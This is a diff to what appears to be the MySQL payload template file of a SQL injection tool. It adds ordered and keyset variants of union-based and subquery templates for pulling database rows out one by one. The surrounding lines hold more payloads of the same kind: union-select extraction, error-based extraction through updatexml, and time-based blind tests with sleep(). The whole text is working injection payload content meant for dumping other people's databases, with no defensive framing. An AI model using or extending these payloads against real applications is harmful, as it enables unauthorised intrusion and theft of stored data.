@@ -3,6 +3,8 @@ exists_column: exists(select {cols} from {table})
 UnionFillStr:1
 UnionAll:1=2 union all select {cols}
 UnionData:1=2 union all select {cols} from `{db}`.`{table}`{where} limit {rowIndex},1
+UnionDataOrdered:1=2 union all select {cols} from `{db}`.`{table}`{where} order by {stableKey} limit {rowIndex},1
+UnionDataKeyset:1=2 union all select {cols} from `{db}`.`{table}`{where} order by {stableKey} limit 1
 UnionDataRows:1=2 union all select {fill} from (select group_concat(sqli_r separator '') sqli_agg from (select {cols} sqli_r from `{db}`.`{table}`{where} limit {rowIndex},{batchSize}) sqli_t) sqli_x
 ErrorData:updatexml(1,concat(0x7e,({cols}),0x7e),1)
 ErrorData@UpdateXml:updatexml(1,concat(0x7e,({cols}),0x7e),1)
@@ -30,6 +32,8 @@ IfNull:ifnull({expr},0x20)
 Ascii:ascii({expr})
 Hex:hex({expr})
 DataValue:(select {cols} from `{db}`.`{table}`{where} limit {rowIndex},1)
+DataValueOrdered:(select {cols} from `{db}`.`{table}`{where} order by {stableKey} limit {rowIndex},1)
+DataValueKeyset:(select {cols} from `{db}`.`{table}`{where} order by {stableKey} limit 1)
 DataCount:(select count(1) from `{db}`.`{table}`{where})
 SleepBoolData: (select 1 from (select(sleep({sleep}-(if(({cond}), 0, {sleep}))))){alias})
 ErrorChunkLen:10
